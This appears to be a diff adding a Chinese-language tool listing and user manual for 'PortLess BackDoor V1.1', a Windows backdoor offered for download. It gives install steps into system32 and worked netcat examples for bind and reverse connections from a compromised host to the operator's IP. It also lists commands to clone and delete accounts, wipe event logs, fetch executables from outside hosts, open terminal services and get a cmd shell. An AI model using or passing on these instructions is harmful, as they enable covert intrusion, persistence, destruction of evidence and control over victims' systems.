@@ -1,0 +1,143 @@
+PortLessNew.zip
+
+提交时间：2003-09-24
+提交用户：w7c
+工具分类：后门程序
+运行平台：Windows
+工具大小：26008 Bytes
+文件MD5 ：560a2e30c3b7fa4d4a2d4a7ae752b6d7
+工具来源：wineggdrop hotmail
+
+PortLess BackDoor V1.1
+
+一个使用svchost.exe去启动,平时不开端口,可以进行反连接的后门程序(和小榕的BITS是同一类型
+的后门).这里先要对bingle致万二分感谢,没有他开放的svchostdll的代码,就不会有这个后门的出
+现,后门中有三分一代码是bingle的代码,所以banner只会显示PortLess BackDoor这样字眼.除了有
+上面的特点外，还加入了相当部分的功能在这后门，加入的功能分别是:
+1.检测克隆帐户
+2.清日志
+3.克隆帐户
+4.删除系统帐户(内建用户Guest,Administrator都能删除)
+5.枚举系统帐户
+6.http下载
+7.安装终端
+8.查看系统所有IP
+9.注销系统
+10.关系统电源
+11.重启
+12.关闭系统
+13.查看系统信息
+14.查看或修改终端端口
+
+
+如何使用:
+1.将portlessinst.exe和svchostdll.dll(不要改名)上传到系统目录(%winnt%\system32目录中)
+2.Portlessinst.exe -install ActiveString Password进行安装
+  这里的ActiveString就是连接那系统打开的端口后输入的验证字符串
+  这里的密码是使用正向连接你连接上后门打开的端口时需要输入的密码
+3.net start iprip(启动后门服务)
+
+使用说明:
+         在连接上肉机任一端口输入验证用的字符串,那个字符串格式是ActiveString|IP:Port,如果你要使用的是
+         反向连接的话，ActiveString,IP,Port都要输入;如果只是想在本地绑入端口模式,不需要输入IP,而且要注意的
+         是两个符号|和:,在IP前的是|,在Port前的是:,如果你弄错了,程序是不能识别的,而且ActiveString,IP和Port之
+         间是没有任何空格的.如果你使用过命令行的Portless V1.0的话，应该对这个有一点认识.
+
+
+使用例子:
+1.假设我已将portlessinst.exe和svchostdll.dll上传到一台IP是12.12.12.12的系统中,这系统
+  的80端口有打开.
+2.运行PortLessinst.exe -install wineggdrop test去安装(会有信息显示是否安装成功)
+3.net start iprip(看到后门启动了)
+
+例子1:进行正向连接
+1.nc 12.12.12.12 80
+2.看到连上后,输入wineggdrop:1982
+3.nc 12.12.12.12 1982,看到"Enter Password: "的Banner后，输入密码test,你就登陆了.
+
+例子2:进行反向连接(假设我的IP是13.13.13.13,这个是我的公网IP)
+1.在自己系统中,运行nc -l -p 12345
+2.nc 12.12.12.12 80
+3.看到连上后,输入wineggdrop|13.13.13.13:12345
+4.然后在运行了nc -l -p 12345这个cmd的窗口中，可以看到你自己登陆了.
+
+登陆后,你并不是得到一个cmd的shell的,如果你使用过winshell,wollf或wineggdropshell的话，
+对这种模式的后门就不会陌生.你登陆后，如果你输入help命令的话，你会看到可以使用很多命令
+的，以下会说明一下这些命令的功能.
+
+命令说明:
+1.CheckClone               功能:检测克隆帐户
+例子:CheckClone
+
+2.CleanEvent               功能:删除系统日志
+例子:CleanEvent
+
+3.Clone                    功能:克隆帐户
+用法:Clone 帐户 要克隆的帐户 密码
+例子:Clone Admin Guest test
+上面例子会将Guest克隆到Admin那个用户中，并且Guest的密码被改为test
+
+4.DelUser                  功能:删除一个用户(这功能可以删除内建用户，所以不要随便用)
+用法:DelUser 用户名
+例子:Deluser Test     
+上面例子会将test这个用户删除
+
+5.Exit                    功能:退出后门
+例子:Exit
+
+6.http://ip/文件名 保存文件名    功能:下载程序
+例子?http://11.11.11.11/a.exe a.exe
+例子?http://www.mysite.com/a.exe a.exe
+例子? http://www.mysite.com:81/a.exe a.exe
+
+7.Installterm 端口               功能:在没有安装终端服务的win 2k服务版的系统中安装终端服务，重启系统后才生效.
+用法:Installterm 3345             (重启后终端会打开3345那个端口,使用此命令前先看看你要定义的终端的端口是否被
+                                   其它程序所用)
+
+8.ListIP                         功能:显示系统所有IP
+例子:ListIP
+
+9.Logoff                         功能:注销系统
+例子:Logoff
+
+10.PowerOff                      功能:关闭电源
+例子:PowerOff
+
+11.Reboot                        功能:重启系统
+例子:Reboot
+
+12.ShutDown                      功能:关闭系统
+例子:ShutDown
+
+13.Shell                         功能:得到一个Cmd Shell
+例子:Shell
+得到Shell要退出,输入exit就能退出后门
+
+14.Sysinfo                       功能说明:查看系统的信息(比较详细)
+例子:Sysinfo
+
+15.TerminalPort                  功能:查看终端服务端口
+例子:TerminalPort          
+
+16.TerminalPort 新的端口         功能:重新设置终端服务端口
+例子:TerminalPort 新的端口
+注意:新端口必须是合法的端口,否则程序会返回错误。
+
+
+如何删除这个后门:
+1.net stop iprip(可能要等一会将所有东西都释放,如果不是强行停止的话，在svclog.log会有一个Quit的信息)
+2.sc delete iprip或portlessinst -uninstall,建议使用portlessinst -unstall命令删除，因为
+用这命令删除的话，会将保存在注册表内的ActiveString和password都删除的.
+
+如何更改ActiveString和Password
+1.Portlessinst -set 新的ActiveString 新的密码
+2.重启后门服务或者重启系统才有生效.
+
+其它说明:
+1.后门只能用在win 2k/xp/2003中
+2.使用反向连接，接受这个反向连接的系统必须有一个公网IP
+3.后门启动时会生成一个svclog.log的文件,这个是记录后门的出错信息和启动信息的,后门启动时
+  会将旧的svclog.log删除,如果你使用不了这后门，可以看看svclog.log中的信息，或者可以看到
+  是哪里出错了.
+4.没有什么时间测试,所以如果有bug的话,不奇怪.
+5.ActiveString和Password最大长度都是64个字符
